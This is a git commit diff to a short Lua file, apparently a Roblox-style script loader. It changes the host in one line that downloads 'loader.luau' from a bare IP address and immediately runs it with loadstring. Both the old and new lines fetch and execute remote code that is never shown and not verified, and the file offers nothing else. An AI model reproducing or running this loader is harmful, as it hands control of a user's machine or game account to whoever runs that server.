48d8e292a3f72903e2724cd4bee2825aaa5408e7
Hasponix <arcadymic@gmail.com>
2025-08-30 18:59:00 +0800

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,2 +1,2 @@
 ID="431a0dd7-6738-4381-8a9c-b1b0645a8f5f";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://5.129.216.170:3910/cdn/loader.luau"))()
